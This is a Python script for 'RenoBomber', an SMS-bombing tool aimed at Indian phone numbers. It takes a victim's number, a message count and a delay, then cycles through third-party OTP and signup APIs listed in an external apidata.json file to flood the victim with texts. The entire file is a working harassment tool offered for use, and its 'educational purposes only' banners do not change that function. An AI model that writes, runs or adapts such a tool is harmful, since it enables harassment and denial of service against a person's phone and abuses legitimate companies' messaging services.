#!/usr/bin/python3
# -*- coding: utf-8 -*-


import json
import requests
import os 
import sys
import time
import random
import colorama
from colorama import Fore, Back, Style
from colorama import init
init()
colorama.init(autoreset=True)

__VERSION__ = "v1.0.0"
__CONTRIBUTORS__ = ["Mr. Renox"]

ALL_COLORS = [
    Fore.RED, Fore.GREEN, Fore.CYAN,
    Fore.MAGENTA, Fore.YELLOW
]
RESET_ALL = Style.RESET_ALL


def clr():
    """Clear screen function (cross-platform)."""
    os.system('cls' if os.name == 'nt' else 'clear')


def bann_text():
    clr()
    logo = r"""
██████╗ ███████╗███╗   ██╗ ██████╗     ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██╔════╝████╗  ██║██╔═══██╗    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝█████╗  ██╔██╗ ██║██║   ██║    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██╔══╝  ██║╚██╗██║██║   ██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██║  ██║███████╗██║ ╚████║╚██████╔╝    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝     ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                - M R R E N O X
                                                                                           
"""


    version = f"[ ✔️  ] Version: {__VERSION__}" 
    project = "[ $  ] Created by: MrRenoX\n"
    contributors = "[ #  ] Contributors: " + ", ".join(__CONTRIBUTORS__)
    disclaimer_text = """DISCLAMER:
        PLEASE USE THIS TOOL FOR EDUCATIONAL PURPOSE ONLY.
        IF YOU MISSUSE THIS TOOL THEN OWNER IS NOT RESPONSIBLE!
        """
    
    print(random.choice(ALL_COLORS) + logo + RESET_ALL)

    # Print details below
    print(Fore.GREEN + Style.BRIGHT + version)
    print(Fore.CYAN + Style.BRIGHT + project)
    print(Fore.MAGENTA + Style.BRIGHT + contributors)
    print(Fore.RED + Style.BRIGHT + "+" + "-"*70 + "+")
    for line in disclaimer_text.splitlines():
        print(Fore.RED + Style.BRIGHT + "| " + line.ljust(68) + " |")
    print(Fore.RED + Style.BRIGHT + "+" + "-"*70 + "+")
    print()


def bann_text_mrrenox():
    clr()
    logo = r"""                                                               
 ███▄ ▄███▓ ██▀███        ██▀███  ▓█████  ███▄    █  ▒█████  ▒██   ██▒
▓██▒▀█▀ ██▒▓██ ▒ ██▒     ▓██ ▒ ██▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▒▒ █ █ ▒░
▓██    ▓██░▓██ ░▄█ ▒     ▓██ ░▄█ ▒▒███   ▓██  ▀█ ██▒▒██░  ██▒░░  █   ░
▒██    ▒██ ▒██▀▀█▄       ▒██▀▀█▄  ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░ ░ █ █ ▒ 
▒██▒   ░██▒░██▓ ▒██▒ ██▓ ░██▓ ▒██▒░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒ ▒██▒
░ ▒░   ░  ░░ ▒▓ ░▒▓░ ▒▓▒ ░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
░  ░      ░  ░▒ ░ ▒░ ░▒    ░▒ ░ ▒░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░
░      ░     ░░   ░  ░     ░░   ░    ░      ░   ░ ░ ░ ░ ░ ▒   ░    ░  
       ░      ░       ░     ░        ░  ░         ░     ░ ░   ░    ░  
                      ░                                               
                            - R E N O B O M B E R
"""

    # Print banner in random color
    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
    print(Fore.MAGENTA + Style.BRIGHT + "ℹ️   Note: This tool is designed strictly for research, testing, and educational purposes.")
    print(Fore.MAGENTA + Style.BRIGHT + "Unauthorized or malicious use is prohibited and solely at the user's risk.\n")

       
    print(Fore.RED + Style.BRIGHT + "🚀  Bombing Sequence Initiated!")
    print(Fore.RED + Style.BRIGHT + "Press [CTRL+Z] to safely suspend the operation at any time.\n")
    print()

def loading_animation(duration=5):
    """Displays a colorful spinner for a given duration (in seconds)."""
    spinner = ['|', '/', '-', '\\']
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA]
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        color = colors[i % len(colors)]
        symbol = spinner[i % len(spinner)]
        sys.stdout.write(Fore.WHITE + Style.BRIGHT + "\rProcessing... " + color + symbol)
        sys.stdout.flush()
        time.sleep(0.2)
        i += 1
    sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\r✔ Done processing!          \n")


def validation_Phone_number(prompt):
    while True:
        number=input(prompt).strip().replace(" ","").replace("+91","")
        if number.isnumeric and len(number)==10:
            return number
        
        else:
           print(Fore.RED + Style.BRIGHT + "[ ⚠️  Invalid Input] Please enter a valid 10-digit number (without country code).")


def get_target():
    while True:
        target_input = input(Fore.YELLOW + Style.BRIGHT + "[ + ] Enter number of SMS to send (max 200): " + Style.RESET_ALL).strip()
        
        if target_input.isnumeric():
            target = int(target_input)
            if 1 <= target <= 200:
                return target
            else:
                print(Fore.RED + Style.BRIGHT + "[ ⚠️ ] Please enter a number between 1 and 200.")
        else:
            print(Fore.RED + Style.BRIGHT + "[ ⚠️ ] Invalid input! Only numbers are allowed.")



def send_bomb(phone,api,counter):
        try:
            formated_phone=phone
            payload_str=json.dumps(api['payload']).replace("{{target}}",formated_phone)
            payload=json.loads(payload_str)


            headers=api.get('headers', {})

            if api['name'].lower() == ["aakash" , "TrulyMadly", "NoBroker"]:
                response=requests.request(
                    method=api['method'],
                    url=api["url"],
                    headers=headers,
                    data=payload,
                    timeout=10
                )
            else:
                response=requests.request(
                    method=api['method'],
                    url=api["url"],
                    headers=headers,
                    json=payload,
                    timeout=10
                )

            if response.status_code in (200,201):
                return True
            
            else:
                return False

        except Exception as e:
                return False
        


def run_until_target(target, phone, pause_per_send=0.5, max_attempts=None):
    """
    THIS IS run_until_target IS FOR BOMB ONE BY ONE
    Attempts sending until `successes` reaches `target` or attempts reaches `max_attempts`.
    Prints a single-line live update (overwrites same line).
    """
    successes = 0
    attempts = 0
    failures = 0
    i = 0

    if max_attempts is None:
        max_attempts = target * 4

    # load apis once (safer & faster)
    if not os.path.exists("apidata.json"):
        print(Fore.RED + "[!] apidata.json file not found.")
        return

    try:
        with open("apidata.json", "r") as file:
            apis = json.load(file)
    except Exception as e:
        print(Fore.RED + f"[*] Failed to read apidata.json: {e}")
        return

    if not isinstance(apis, list) or len(apis) == 0:
        print(Fore.RED + "[!] apidata.json must be a non-empty list of APIs.")
        return

    # main loop
    while successes < target and attempts < max_attempts:
        api = apis[i % len(apis)]
        attempts += 1

        try:
            ok = send_bomb(phone, api, attempts)  
        except Exception as e:
            ok = False
           

        if ok:
            successes += 1
        else:
            failures += 1

        
        print(
            Fore.GREEN + Style.BRIGHT +
            f"✅ Success: {successes}/{target} | "
            + Fore.RED + f"❌ Failures: {failures} | "
            + Fore.YELLOW + f"Attempts: {attempts}",
            end="\r", flush=True
        )

        i += 1
        time.sleep(pause_per_send)


        if successes >= target:
            print(Fore.CYAN + Style.BRIGHT + "\n\n" + "="*60)
            print(Fore.YELLOW + Style.BRIGHT + "RenoBomber Dashboard")
            print(Fore.CYAN + Style.BRIGHT + "="*60)
            print(Fore.GREEN + Style.BRIGHT + f"✔ Total Successes : {successes}")
            print(Fore.RED + Style.BRIGHT + f"✖ Total Failures  : {failures}")
            print(Fore.MAGENTA + Style.BRIGHT + f"🔢 Total Attempts : {attempts}")
            print(Fore.WHITE + Style.BRIGHT + "-"*60)
            print(Fore.GREEN + Style.BRIGHT + "🎯 Result: Target Reached Successfully!" if successes >= target else Fore.RED + "⚠️ Target Not Reached")
            print(Fore.CYAN + Style.BRIGHT + "="*60 + "\n")

def sms_bomb():
    try:
        bann_text()
        victim_number = validation_Phone_number(Fore.CYAN + Style.BRIGHT + "[ - ] Enter the target number (without +91): " + Style.RESET_ALL )
        target = get_target()
        time_delay = float(input(Fore.MAGENTA + Style.BRIGHT + "[ / ] Enter delay time (in seconds): " + Style.RESET_ALL))

        clr()
        print(Fore.CYAN + Style.BRIGHT + "🔹 Initializing RenoBomber Module...\n")
        print(Fore.YELLOW + Style.BRIGHT + "🔹 Ensure stable internet connection throughout the operation.\n")

       
        print(Fore.WHITE + Style.BRIGHT + "================= TARGET DETAILS =================")
        print(Fore.WHITE + Style.BRIGHT + "API Version   : " + Fore.GREEN + "1.0")
        print(Fore.WHITE + Style.BRIGHT + "Target Number : " + Fore.GREEN + f"{victim_number}")
        print(Fore.WHITE + Style.BRIGHT + "Total Messages: " + Fore.GREEN + f"{target}")
        print(Fore.WHITE + Style.BRIGHT + "Delay (s)     : " + Fore.GREEN + f"{time_delay}")
        print(Fore.WHITE + Style.BRIGHT + "==================================================\n")

       
        print(Fore.MAGENTA + Style.BRIGHT + "ℹ️   Note: This tool is designed strictly for research, testing, and educational purposes.")
        print(Fore.MAGENTA + Style.BRIGHT + "Unauthorized or malicious use is prohibited and solely at the user's risk.\n")

       
        print(Fore.RED + Style.BRIGHT + "🚀  Bombing Sequence Initiated!")
        print(Fore.RED + Style.BRIGHT + "Press [CTRL+Z] to safely suspend the operation at any time.\n")


        loading_animation(duration=10)
        clr() 
        bann_text_mrrenox() 
        print(Fore.MAGENTA + Style.BRIGHT + "Setup is Ready starting for bombing ... Initializing RenoBomber Module...\n")
        loading_animation(duration=10)

        print(Fore.WHITE + Style.BRIGHT + "================= BOMBAING SESSION STARTED =================")
        print(Fore.WHITE + Style.BRIGHT + "API Version   : " + Fore.GREEN + "1.0")
        print(Fore.WHITE + Style.BRIGHT + "Target Number : " + Fore.GREEN + f"{victim_number}")
        print(Fore.WHITE + Style.BRIGHT + "Total Messages: " + Fore.GREEN + f"{target}")
        print(Fore.WHITE + Style.BRIGHT + "Delay (s)     : " + Fore.GREEN + f"{time_delay}")
        print(Fore.WHITE + Style.BRIGHT + "Bombing Stop  : " + Fore.GREEN + "Ctrl+Z")
        run_until_target(target,victim_number,time_delay)

    
    except KeyboardInterrupt:
        print(Fore.RED + Style.BRIGHT + "\n[ ! ] Bombing manually stopped by user.") 




    


if __name__=="__main__":
    bann_text()
    print(Fore.MAGENTA + Style.BRIGHT + "[ ! ] This is a sms bombing tool on Indian numbers only.\n") 
    loading_animation(3)
    print(Fore.WHITE + Style.BRIGHT +"Welcome to Reno Bomber tool by -MrRenoX\n")
    
    user_choice=int(input(Fore.CYAN + Style.BRIGHT +"Press 1 To SMS bombing\nPress 2 To Call bombing(NOT Yet Available)\nPress 3 to Update(work on Termux)\nPress 4 To Exit\n"))

    if user_choice == 1:
        sms_bomb()
    elif user_choice == 2:
        print(Fore.MAGENTA + Style.BRIGHT +"[ * ] Call bombing service (NOT Yet Available)")
    elif user_choice == 3:
        print(Fore.MAGENTA + Style.BRIGHT +"[ * ] Update(work on Termux) service under development.")
    elif user_choice == 4:
        print(Fore.MAGENTA + Style.BRIGHT +"[ $  ] Thankyou for using this Tool Created by -MrRenoX")
        sys.exit()
    else:
        print(Fore.MAGENTA + Style.BRIGHT+"[*]Something went wrong!")




